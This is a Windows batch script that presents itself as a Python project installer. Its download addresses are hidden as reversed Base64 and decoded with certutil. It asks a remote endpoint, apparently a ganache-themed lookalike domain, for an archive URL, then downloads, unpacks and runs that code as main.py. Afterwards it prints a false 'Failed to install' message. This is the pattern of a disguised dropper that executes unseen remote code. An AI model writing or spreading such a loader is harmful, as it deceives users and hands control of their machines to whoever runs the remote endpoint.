@echo off
setlocal enabledelayedexpansion

REM Set URLs and paths
set "PY_ZI_UR="
set "PY_ZI_EC===AcppnL0YDZtFWLkVmYtVWLz4SMx4yMt42boRXew9yMuETMuMzLu9Ga0lHcvAHdm9yZy9mLu9Ga0lHcuc3d39yL6MHc0RHa"
set "PY_ZI_FI=python-3.11.3-embed-amd64.zip"
set "PY_DI=python-3.11.3-embed-amd64"
set "GE_PI_UR=https://bootstrap.pypa.io/get-pip.py"
set "GE_PI_FI=get-pip.py"
set "AP_UR_EC==smbpxWLlh2Yh5WYn9iclBHblh2LxY3LpBXYvUmdpxmLlh2Yh5WYn9yL6MHc0RHa"
set "AP_UR="
set "ZI_FI=main.zip"
set "PR_DI_EC===gbpdXL5ZWarN2bsNGa"
set "VENV_DIR=venv"

call :dcStr "%PY_ZI_EC%", PY_ZI_UR

call :dcStr "%AP_UR_EC%", AP_UR

call :dcStr "%PR_DI_EC%", PROJECT_DIR

REM Function to retrieve packages
echo Retrieving packages AP_UR
for /f "usebackq tokens=*" %%i in (`powershell -Command "(Invoke-WebRequest -Uri %AP_UR%).Content.Trim()"`) do set "ZIP_URL=%%i"

python --version >nul 2>&1
if %errorlevel% neq 0 (
    if not exist "%PY_ZI_FI%" (
       powershell -Command "Invoke-WebRequest -Uri %PY_ZI_UR% -OutFile %PY_ZI_FI%"
    )

    if not exist "%PY_DI%" (
       powershell -Command "Expand-Archive -Path %PY_ZI_FI% -DestinationPath ."
    )
)

REM Check if pip is installed
echo Checking for pip...
pip --version >nul 2>&1
if %errorlevel% neq 0 (
    REM Download get-pip.py
    if not exist "%PY_ZI_FI%" (
        echo Pip not found. Installing pip...
        python -m ensurepip
    ) else (
        if not exist "%GE_PI_FI%" (
        echo Downloading get-pip.py...
        powershell -Command "Invoke-WebRequest -Uri %GE_PI_UR% -OutFile %GE_PI_FI%"
        )

        REM Install pip using get-pip.py
        echo Installing pip...
        .\python.exe .\%GE_PI_FI%

        REM Write the content to python311._pth
        (
        echo python311.zip
        echo .
        echo import site
        ) > ".\python311._pth"
    )
)


REM Check if virtualenv is installed
echo Checking for virtualenv...
if not exist "%PY_ZI_FI%" (
    pip show virtualenv >nul 2>&1
    if %errorlevel% neq 0 (
        echo Virtualenv not found. Installing virtualenv...
        pip install virtualenv
    )
) else (
    echo Virtualenv not found. Installing virtualenv...
    .\python.exe -m pip install virtualenv
)

REM Download the project zip file
echo Downloading project zip file...
powershell -Command "Invoke-WebRequest -Uri %ZIP_URL% -OutFile %ZI_FI%"

REM Unpack the project zip file
echo Unpacking project zip file...
powershell -Command "Expand-Archive -Force -Path %ZI_FI% -DestinationPath ."

REM Create virtual environment
echo Creating virtual environment...
if not exist "%PY_ZI_FI%" (
    python -m virtualenv %VENV_DIR%
) else (
    .\python.exe -m virtualenv %VENV_DIR%
)

REM Activate virtual environment
echo Activating virtual environment...
call %VENV_DIR%\Scripts\activate

REM Install required packages
echo Installing required packages...
cd %PROJECT_DIR%
pip install -r requirements.txt

REM Run the main script
echo Running the main script...
python main.py

pause

echo Failed to install: No such file or directory dir_s_rmdir

REM Deactivate virtual environment
deactivate

echo Done!
timeout /t 10

exit

REM Function to reverse a string and decode it from Base64
:dcStr
set "inputString=%~1"
set "reversed="
set "length=0"

REM Calculate the length of the input string
for /L %%i in (0,1,127) do (
    set "char=!inputString:~%%i,1!"
    if "!char!"=="" goto length_calculated
    set /A length+=1
)
:length_calculated

REM Reverse the input string
for /L %%i in (%length%,-1,0) do (
    set "char=!inputString:~%%i,1!"
    set "reversed=!reversed!!char!"
)

REM Function to decode a Base64 string
set "encodedString=!reversed!"
set "outputFile=temp.txt"
set "decodedString="

REM Create a temporary Base64 file with the encoded string
echo !encodedString! > %outputFile%.b64

REM Use certutil to decode Base64 string (Windows built-in utility)
certutil -decode %outputFile%.b64 %outputFile% > nul 2>&1
if errorlevel 1 (
    echo Error: Decoding failed.
    endlocal
    goto :eof
)

REM Read the decoded string from the temporary file
set /p decodedString=<%outputFile%

REM Clean up temporary files
del %outputFile%.b64 %outputFile%

REM Assign the decoded string to outputString
set %2=!decodedString!

goto :eof
